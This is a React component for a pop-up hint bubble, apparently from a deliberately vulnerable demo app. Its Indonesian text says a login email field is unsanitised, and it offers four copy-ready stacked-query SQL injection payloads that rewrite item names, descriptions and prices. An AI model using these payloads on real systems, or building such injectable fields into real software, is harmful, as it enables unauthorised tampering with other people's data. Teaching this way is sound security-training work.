import { useState } from 'react';

const Bubble: React.FC = () => {
  const [isOpen, setIsOpen] = useState(false);

  const togglePopup = () => {
    setIsOpen(!isOpen);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => alert("Copied to clipboard!"));
  };

  return (
    <div className="fixed bottom-4 right-4 flex flex-col items-end">
      {isOpen && (
        <div className="mb-2 bg-white text-black text-sm p-6 rounded-lg shadow-lg border border-gray-200 w-auto max-w-sm">
          <h3 className="font-semibold text-lg mb-4">SQL Injection Scenarios</h3>
          <h2>Text field email dalam login belum steril, sehingga bisa dilakukan sql injection</h2>
          <h2><br></br>Coba lakukan hal di bawah ini:</h2>
          
          <div className="mb-6">
            <p className="font-semibold mb-1">Change Name Only:</p>
            <div className="bg-gray-100 p-3 rounded text-sm relative w-full overflow-hidden">
              <pre className="whitespace-pre-wrap break-words overflow-x-auto w-[90%]">{`'; UPDATE items SET name='Modified Name' WHERE id=2; --`}</pre>
              <button
                onClick={() => copyToClipboard(`'; UPDATE items SET name='Modified Name' WHERE id=2; --`)}
                className="absolute top-1 right-1 bg-blue-500 text-white px-2 py-1 rounded text-xs"
              >
                Copy
              </button>
            </div>
          </div>

          <div className="mb-6">
            <p className="font-semibold mb-1">Change Name and Description:</p>
            <div className="bg-gray-100 p-3 rounded text-sm relative w-full overflow-hidden">
              <pre className="whitespace-pre-wrap break-words overflow-x-auto w-[90%]">{`'; UPDATE items SET name='New Name', description='New Description' WHERE id=2; --`}</pre>
              <button
                onClick={() => copyToClipboard(`'; UPDATE items SET name='New Name', description='New Description' WHERE id=2; --`)}
                className="absolute top-1 right-1 bg-blue-500 text-white px-2 py-1 rounded text-xs"
              >
                Copy
              </button>
            </div>
          </div>

          <div className="mb-6">
            <p className="font-semibold mb-1">Change All Fields (Name, Description, Price):</p>
            <div className="bg-gray-100 p-3 rounded text-sm relative w-full overflow-hidden">
              <pre className="whitespace-pre-wrap break-words overflow-x-auto w-[90%]">{`'; UPDATE items SET name='Fully Modified', description='All fields changed', price=999.99 WHERE id=2; --`}</pre>
              <button
                onClick={() => copyToClipboard(`'; UPDATE items SET name='Fully Modified', description='All fields changed', price=999.99 WHERE id=2; --`)}
                className="absolute top-1 right-1 bg-blue-500 text-white px-2 py-1 rounded text-xs"
              >
                Copy
              </button>
            </div>
          </div>

          <div>
            <p className="font-semibold mb-1">Target a Different Item:</p>
            <div className="bg-gray-100 p-3 rounded text-sm relative w-full overflow-hidden">
              <pre className="whitespace-pre-wrap break-words overflow-x-auto w-[90%]">{`'; UPDATE items SET name='Changed Item', description='Updated via SQL injection', price=50.50 WHERE id=1; --`}</pre>
              <button
                onClick={() => copyToClipboard(`'; UPDATE items SET name='Changed Item', description='Updated via SQL injection', price=50.50 WHERE id=1; --`)}
                className="absolute top-1 right-1 bg-blue-500 text-white px-2 py-1 rounded text-xs"
              >
                Copy
              </button>
            </div>
          </div>
        </div>
      )}
      
      <button
        onClick={togglePopup}
        className="bg-blue-500 w-14 h-14 rounded-full flex items-center justify-center text-white text-lg shadow-md hover:bg-blue-600 transition duration-300 ease-in-out"
      >
        💬
      </button>
    </div>
  );
};

export default Bubble;
